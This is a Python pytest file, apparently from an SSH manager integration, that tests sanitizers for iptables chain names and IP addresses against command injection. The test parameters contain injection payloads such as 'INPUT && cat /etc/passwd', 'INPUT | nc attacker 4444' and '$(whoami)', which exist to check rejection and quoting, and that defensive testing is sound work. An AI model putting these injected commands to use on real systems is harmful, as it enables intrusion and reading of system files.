# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from __future__ import annotations

from unittest import mock

import pytest

from ssh.core.SshManager import (
    SshManager,
    SshManagerError,
    sanitize_ip_address,
    sanitize_iptables_chain,
)


@pytest.mark.parametrize(
    ("chain", "expected"),
    [
        ("", ""),
        (None, ""),
        ("   ", ""),
        ("INPUT", "INPUT"),
        ("  OUTPUT  ", "OUTPUT"),
        ("DOCKER-USER", "DOCKER-USER"),
        ("cali-fw-cali1234", "cali-fw-cali1234"),
        ("cali:abcdef0123456789", "cali:abcdef0123456789"),
        ("allow.ssh", "allow.ssh"),
        ("eth0/in", "eth0/in"),
        ("KUBE-SVC-NPX46M4PTMTKRN6Y", "KUBE-SVC-NPX46M4PTMTKRN6Y"),
        ("a" * 200, "a" * 200),
    ],
)
def test_sanitize_iptables_chain_accepts_valid_chains(
    chain: str | None, expected: str
) -> None:
    """Valid chain names (anything iptables itself accepts) pass through unchanged."""
    assert sanitize_iptables_chain(chain) == expected


@pytest.mark.parametrize(
    "chain",
    [
        "INPUT; id",
        "INPUT && cat /etc/passwd",
        "INPUT | nc attacker 4444",
        "INPUT\nid",
        "INPUT OUTPUT",
        "-F",
        "--flush",
        "!INPUT",
    ],
)
def test_sanitize_iptables_chain_rejects_what_iptables_rejects(chain: str) -> None:
    """Whitespace and option-like values are rejected before any SSH connection."""
    with pytest.raises(SshManagerError):
        sanitize_iptables_chain(chain)


@pytest.mark.parametrize(
    ("chain", "expected"),
    [
        ("$(whoami)", "'$(whoami)'"),
        ("`id`", "'`id`'"),
        ("INPUT;id", "'INPUT;id'"),
        ("INPUT|id", "'INPUT|id'"),
        ("INPUT&&id", "'INPUT&&id'"),
        ("my$chain", "'my$chain'"),
    ],
)
def test_sanitize_iptables_chain_neutralizes_shell_metacharacters(
    chain: str, expected: str
) -> None:
    """Shell metacharacters without whitespace are single-quoted as one literal argument."""
    assert sanitize_iptables_chain(chain) == expected


@pytest.mark.parametrize(
    ("ip_address", "expected"),
    [
        ("192.168.1.1", "192.168.1.1"),
        (" 10.0.0.0/24 ", "10.0.0.0/24"),
        ("10.0.0.5/24", "10.0.0.5/24"),
        ("10.0.0.0/255.0.0.0", "10.0.0.0/255.0.0.0"),
        ("2001:db8::1", "2001:db8::1"),
        ("2001:db8::/32", "2001:db8::/32"),
        ("1.1.1.1,2.2.2.2", "1.1.1.1,2.2.2.2"),
        ("attacker.example.com", "attacker.example.com"),
    ],
)
def test_sanitize_ip_address_accepts_everything_iptables_accepts(
    ip_address: str, expected: str
) -> None:
    """IPs, CIDRs, dotted masks, comma lists and hostnames pass through verbatim."""
    assert sanitize_ip_address(ip_address) == expected


@pytest.mark.parametrize(
    "ip_address",
    ["1.1.1.1; id;", "1.1.1.1 -j ACCEPT", "-j", "!1.1.1.1", "", "   ", None],
)
def test_sanitize_ip_address_rejects_invalid_values(ip_address: str | None) -> None:
    """Whitespace, option-like, negated and empty values are rejected."""
    with pytest.raises(SshManagerError):
        sanitize_ip_address(ip_address)


@pytest.mark.parametrize(
    ("ip_address", "expected"),
    [("$(id)", "'$(id)'"), ("1.1.1.1;id", "'1.1.1.1;id'")],
)
def test_sanitize_ip_address_neutralizes_shell_metacharacters(
    ip_address: str, expected: str
) -> None:
    """Metacharacters without whitespace are single-quoted, never interpreted."""
    assert sanitize_ip_address(ip_address) == expected


def test_list_iptables_rules_rejects_injection_before_connecting() -> None:
    """A malicious chain must be rejected before any SSH session is opened."""
    manager = SshManager("10.0.0.1", "user", "pass")
    with (
        mock.patch.object(manager, "_create_ssh_client") as create_client,
        mock.patch.object(manager, "_run_command") as run_command,
    ):
        with pytest.raises(SshManagerError):
            manager.list_iptables_rules("INPUT; id")

    create_client.assert_not_called()
    run_command.assert_not_called()


@pytest.mark.parametrize(
    ("chain", "expected_command"),
    [
        ("", "iptables -S"),
        ("INPUT", "iptables -S INPUT"),
        ("DOCKER-USER", "iptables -S DOCKER-USER"),
    ],
)
def test_list_iptables_rules_builds_expected_command(
    chain: str, expected_command: str
) -> None:
    """Valid chains (and the empty default) produce the exact iptables command."""
    manager = SshManager("10.0.0.1", "user", "pass")
    output = mock.MagicMock()
    output.readlines.return_value = ["-P INPUT ACCEPT\n"]
    manager.client = mock.MagicMock()
    with (
        mock.patch.object(manager, "_create_ssh_client"),
        mock.patch.object(
            manager, "_run_command", return_value=(0, output, None)
        ) as run_command,
    ):
        status_code, data_table, _ = manager.list_iptables_rules(chain)

    run_command.assert_called_once_with(expected_command)
    assert status_code == 0
    assert data_table == ["-,Chain,Rule", "-P,INPUT,ACCEPT"]
